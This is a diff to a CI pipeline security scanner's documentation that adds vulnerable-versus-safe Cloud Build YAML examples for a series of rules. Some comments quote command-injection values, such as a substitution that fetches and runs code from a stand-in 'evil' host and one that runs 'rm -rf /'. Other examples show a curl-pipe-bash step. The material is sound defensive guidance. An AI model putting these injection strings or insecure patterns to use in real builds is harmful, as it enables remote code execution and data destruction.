@@ -4934,6 +4934,25 @@ steps:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``gcr.io/cloud-builders/gcloud`` resolves to
+# the registry's latest at build time. Google's update of
+# the underlying image is silently picked up; a namespace
+# / publisher takeover would ship malicious code into
+# every Cloud Build that uses the step.
+steps:
+  - name: gcr.io/cloud-builders/gcloud
+    args: [run, deploy, app, --image, us-central1-docker.pkg.dev/proj/repo/app]
+
+# Safe: pin to the content-addressable digest. Renovate /
+# Dependabot bump the digest in reviewable PRs.
+steps:
+  - name: gcr.io/cloud-builders/gcloud@sha256:abc123...
+    args: [run, deploy, app, --image, us-central1-docker.pkg.dev/proj/repo/app]
+```
+
 **Source:** [`GCB-001`](../providers/cloudbuild.md#gcb-001) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 ### `GCB-002`: Cloud Build uses the default service account <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-002 }
@@ -4943,6 +4962,30 @@ steps:
 **How this is detected.** The default Cloud Build service account historically held ``roles/cloudbuild.builds.builder`` plus project-level editor in many organisations. Even under the GCP April-2024 default-identity change, the default SA is still broader than what a single pipeline needs. Explicit ``serviceAccount:`` is required to pass.
 
 **Recommendation.** Create a dedicated service account for the build, grant it only the roles the pipeline actually needs (``roles/artifactregistry.writer``, ``roles/storage.objectCreator`` for artifact upload, etc.), and set ``serviceAccount: projects/<PROJECT>/serviceAccounts/<NAME>@...``. Leaving it unset falls back to the default Cloud Build SA, which accumulates roles over a project's lifetime and is routinely granted ``roles/editor``.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: no ``serviceAccount:`` declared. Cloud Build
+# falls back to the legacy default
+# ``<proj-num>@cloudbuild.gserviceaccount.com``, which on
+# older projects carries Project Editor or has manually-
+# granted Storage Admin / Run Admin / etc. Any build (even
+# from a fork PR trigger) executes with that authority.
+steps:
+  - name: gcr.io/cloud-builders/gcloud@sha256:abc123...
+    args: [deploy]
+# no serviceAccount: line — uses the legacy default SA
+
+# Safe: declare a custom service account scoped to the
+# minimum roles this pipeline needs (Cloud Run Deployer
+# on a single service, Artifact Registry Reader on the
+# specific repo). Each pipeline gets its own SA.
+serviceAccount: projects/myproj/serviceAccounts/cd-pipeline@myproj.iam.gserviceaccount.com
+steps:
+  - name: gcr.io/cloud-builders/gcloud@sha256:abc123...
+    args: [deploy]
+```
 
 **Source:** [`GCB-002`](../providers/cloudbuild.md#gcb-002) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -4958,6 +5001,41 @@ steps:
 
 - Steps whose sole purpose is to *grant* a service account access to a secret (``gcloud secrets add-iam-policy-binding``) reference the resource URI without exposing the value. The literal-URI regex doesn't distinguish read from administrative operations. Suppress those specific steps via ``--ignore-file`` once you've confirmed the gcloud subcommand is administrative.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``args`` carries a Secret Manager reference.
+# Cloud Build resolves it at substitution time and the
+# expanded value lands in the build's args[], which the
+# Cloud Build log records verbatim. Any IAM principal
+# with ``cloudbuild.builds.get`` reads the value.
+steps:
+  - name: gcr.io/cloud-builders/curl@sha256:abc123...
+    args: [--header, "Authorization: Bearer $$API_TOKEN", https://api.example.com/deploy]
+    secretEnv: [API_TOKEN]
+availableSecrets:
+  secretManager:
+    - versionName: projects/myproj/secrets/api-token/versions/latest
+      env: API_TOKEN
+
+# Safe: keep the secret in ``secretEnv`` only, never in
+# ``args``. The step body references the env var by name
+# (``$$API_TOKEN`` is a Cloud Build escape that becomes
+# ``$API_TOKEN`` at shell-runtime), so the build log
+# records the env name rather than the value.
+steps:
+  - name: gcr.io/cloud-builders/curl@sha256:abc123...
+    entrypoint: bash
+    args:
+      - -c
+      - curl --header "Authorization: Bearer $$API_TOKEN" https://api.example.com/deploy
+    secretEnv: [API_TOKEN]
+availableSecrets:
+  secretManager:
+    - versionName: projects/myproj/secrets/api-token/versions/1
+      env: API_TOKEN
+```
+
 **Source:** [`GCB-003`](../providers/cloudbuild.md#gcb-003) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 ### `GCB-004`: dynamicSubstitutions on with user substitutions in step args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-004 }
@@ -4971,6 +5049,38 @@ steps:
 **Known false positives.**
 
 - Pipelines that enable ``dynamicSubstitutions`` solely to use bash parameter expansion on *built-in* substitutions (``${PROJECT_ID/-/_}``) still flag if any step also references a ``$_USER_VAR``, even when the user sub lands in a context that can't reach a shell. The rule has no AST-level awareness of which substitution is consumed by which shell context. Suppress per-step via ``--ignore-file`` after verifying the user sub never feeds bash re-evaluation.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``dynamicSubstitutions: true`` expands
+# ``${USER_INPUT}`` at args-evaluation time. A trigger
+# substitution carrying ``v1.0";curl evil|bash;"`` lands
+# the metacharacters in the args array — the step's shell
+# parses them as separate commands.
+substitutions:
+  _TAG: v1.0
+options:
+  dynamicSubstitutions: true
+steps:
+  - name: gcr.io/cloud-builders/docker@sha256:abc123...
+    args: [build, -t, "image:${_TAG}", .]
+
+# Safe: either disable dynamicSubstitutions (use literal
+# substitutions instead) or pass the substitution through
+# an env var and let the shell handle quoting. The
+# substitution becomes a single string argument the
+# attacker can't escape from.
+substitutions:
+  _TAG: v1.0
+steps:
+  - name: gcr.io/cloud-builders/docker@sha256:abc123...
+    entrypoint: bash
+    env: [TAG=${_TAG}]
+    args:
+      - -c
+      - docker build -t "image:$TAG" .
+```
 
 **Source:** [`GCB-004`](../providers/cloudbuild.md#gcb-004) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -4997,6 +5107,33 @@ steps:
 **Known false positives.**
 
 - ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``eval`` on a value that came from a
+# substitution (or anywhere outside the step body) gives
+# the value full shell-grammar reach. ``sh -c`` on an
+# unquoted variable is the same shape.
+steps:
+  - name: gcr.io/cloud-builders/bash@sha256:abc123...
+    entrypoint: bash
+    args:
+      - -c
+      - eval "$BUILD_CMD"
+    env: [BUILD_CMD=${_USER_CMD}]
+
+# Safe: never eval untrusted input. Replace the dynamic
+# command with an explicit dispatcher over an allow-list
+# of safe actions, or invoke a script you own that does
+# its own input validation.
+steps:
+  - name: gcr.io/cloud-builders/bash@sha256:abc123...
+    entrypoint: bash
+    args:
+      - -c
+      - ./scripts/dispatch.sh "${_USER_CMD}"
+```
 
 **Source:** [`GCB-006`](../providers/cloudbuild.md#gcb-006) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -5040,6 +5177,34 @@ steps:
 
 **Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository and invoke it from the checkout, removing the network fetch removes the attacker-controllable content entirely.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` lets an attacker who
+# controls DNS / the installer host substitute the script
+# at install time. The injected code runs in the step's
+# shell with the build's full credential set.
+steps:
+  - name: gcr.io/cloud-builders/bash@sha256:abc123...
+    entrypoint: bash
+    args:
+      - -c
+      - curl -fsSL https://installer.example.com/cli.sh | bash
+
+# Safe: download, verify a sha256 digest from a trusted
+# source, then execute.
+steps:
+  - name: gcr.io/cloud-builders/bash@sha256:abc123...
+    entrypoint: bash
+    args:
+      - -c
+      - |
+        set -e
+        curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+        echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+        bash /tmp/cli.sh
+```
+
 **Source:** [`GCB-010`](../providers/cloudbuild.md#gcb-010) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 ### `GCB-011`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-011 }
@@ -5052,6 +5217,25 @@ steps:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl -k`` disables certificate verification
+# for the duration of the call. An attacker on the network
+# path (compromised proxy, malicious VPN exit) MITMs the
+# response and ships substituted bytes into the build.
+steps:
+  - name: gcr.io/cloud-builders/curl@sha256:abc123...
+    args: [-k, -O, https://internal-mirror.example.com/artifact.tar.gz]
+
+# Safe: keep TLS verification on. If the internal mirror
+# uses a private CA, install the CA into the step image's
+# trust store rather than papering over with ``-k``.
+steps:
+  - name: gcr.io/cloud-builders/curl@sha256:abc123...
+    args: [-O, https://internal-mirror.example.com/artifact.tar.gz]
+```
+
 **Source:** [`GCB-011`](../providers/cloudbuild.md#gcb-011) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 ### `GCB-012`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gcb-012 }
@@ -5061,6 +5245,37 @@ steps:
 **How this is detected.** Complements GCB-003 (inline ``gcloud secrets versions access``) and GCB-007 (``/versions/latest`` alias). This rule runs the shared credential-shape catalog against every string in the YAML. AWS keys, GitHub PATs, Slack webhooks, JWTs, PEM private key blocks, and any user-registered ``--secret-pattern`` regex. Known placeholders like ``EXAMPLE``/``CHANGEME`` are already filtered upstream so fixtures and docs don't false-match.
 
 **Recommendation.** Rotate the exposed credential immediately. Move the value to ``availableSecrets.secretManager`` and reference it via ``secretEnv:`` so the plaintext never lands in the YAML or the build logs. For cloud access prefer workload-identity federation over long-lived keys.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the AWS access key literal lives in
+# ``substitutions:``. The Cloud Build YAML is committed
+# to git and the build log echoes the value whenever the
+# step prints its environment.
+substitutions:
+  _AWS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+  _AWS_SECRET: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+steps:
+  - name: amazon/aws-cli@sha256:abc123...
+    env: [AWS_ACCESS_KEY_ID=${_AWS_KEY_ID}, AWS_SECRET_ACCESS_KEY=${_AWS_SECRET}]
+    args: [s3, cp, ./build, s3://bucket/]
+
+# Safe: fetch from Secret Manager via ``availableSecrets``.
+# The build references the secret by version name; the
+# value never lands in the build YAML or in plaintext
+# logs (Cloud Build masks ``secretEnv`` values).
+steps:
+  - name: amazon/aws-cli@sha256:abc123...
+    secretEnv: [AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY]
+    args: [s3, cp, ./build, s3://bucket/]
+availableSecrets:
+  secretManager:
+    - versionName: projects/p/secrets/aws-key-id/versions/1
+      env: AWS_ACCESS_KEY_ID
+    - versionName: projects/p/secrets/aws-secret/versions/1
+      env: AWS_SECRET_ACCESS_KEY
+```
 
 **Source:** [`GCB-012`](../providers/cloudbuild.md#gcb-012) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -5083,6 +5298,30 @@ steps:
 **Recommendation.** Remove the ``logging: NONE`` override, or replace it with ``CLOUD_LOGGING_ONLY`` / ``GCS_ONLY``, so every step's stdout, stderr, and exit code is persisted. Loss of logs is a detection-and-response black hole; the storage cost is measured in cents.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``logging: NONE`` disables build log capture
+# entirely. Failures, attacker activity, secret leaks —
+# nothing is recorded. Forensics on a compromise is
+# impossible because the build has no log trail.
+options:
+  logging: NONE
+steps:
+  - name: gcr.io/cloud-builders/docker@sha256:abc123...
+    args: [build, -t, app, .]
+
+# Safe: leave logging at the default (``CLOUD_LOGGING_ONLY``)
+# or explicitly send to a hardened Cloud Storage bucket
+# with retention + IAM tied down. Logs are the audit trail
+# for every other security control.
+options:
+  logging: CLOUD_LOGGING_ONLY
+steps:
+  - name: gcr.io/cloud-builders/docker@sha256:abc123...
+    args: [build, -t, app, .]
+```
 
 **Source:** [`GCB-014`](../providers/cloudbuild.md#gcb-014) in the [Cloud Build provider](../providers/cloudbuild.md).
 
@@ -5142,6 +5381,34 @@ steps:
 
 - Substitutions whose values are *server-controlled* in practice (e.g. the trigger always supplies a SHA from ``$_HEAD_COMMIT_SHA`` aliased into a ``$_BUILD_TAG`` by the trigger config) still match the user-sub regex because Cloud Build can't distinguish locked from editable trigger fields. Suppress per-step via ``--ignore-file`` once you've verified your trigger policy prevents arbitrary substitution overrides, ideally combined with ``options.substitutionOption: MUST_MATCH`` (GCB-022) to make the lock explicit.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``entrypoint: bash`` plus a user substitution
+# inside ``args:`` means the substitution's content is
+# parsed by bash. A trigger substitution carrying shell
+# metacharacters (``v1.0";rm -rf /;"``) executes as
+# separate commands.
+steps:
+  - name: gcr.io/cloud-builders/bash@sha256:abc123...
+    entrypoint: bash
+    args:
+      - -c
+      - echo "building ${_TAG}" && ./build.sh --tag ${_TAG}
+
+# Safe: pass the substitution through an env var so the
+# shell sees one argument. Quote on every use. The shell
+# treats injected metacharacters as literal characters
+# in the env value.
+steps:
+  - name: gcr.io/cloud-builders/bash@sha256:abc123...
+    entrypoint: bash
+    env: [TAG=${_TAG}]
+    args:
+      - -c
+      - echo "building $TAG" && ./build.sh --tag "$TAG"
+```
+
 **Source:** [`GCB-019`](../providers/cloudbuild.md#gcb-019) in the [Cloud Build provider](../providers/cloudbuild.md).
 
 ### `GCB-020`: serviceAccount points at the default Cloud Build service account <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-020 }
@@ -5155,6 +5422,29 @@ steps:
 **Known false positives.**
 
 - Single-pipeline GCP projects where the default SA's roles are actively scoped down. Rare in practice; create a named SA anyway so the audit log stays unambiguous about which pipeline made each API call.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``serviceAccount:`` is set but points at the
+# legacy default Cloud Build SA. The default carries
+# Project Editor (older projects) or whatever roles got
+# attached over time; sharing it across pipelines collapses
+# the blast radius of any one compromise to every pipeline.
+serviceAccount: projects/myproj/serviceAccounts/123456789@cloudbuild.gserviceaccount.com
+steps:
+  - name: gcr.io/cloud-builders/gcloud@sha256:abc123...
+    args: [deploy]
+
+# Safe: create a per-pipeline service account with only
+# the roles this pipeline needs. The default SA stays out
+# of any builds you author; if it lingers on a legacy
+# trigger you don't control, audit and migrate.
+serviceAccount: projects/myproj/serviceAccounts/cd-app@myproj.iam.gserviceaccount.com
+steps:
+  - name: gcr.io/cloud-builders/gcloud@sha256:abc123...
+    args: [deploy]
+```
 
 **Source:** [`GCB-020`](../providers/cloudbuild.md#gcb-020) in the [Cloud Build provider](../providers/cloudbuild.md).
 
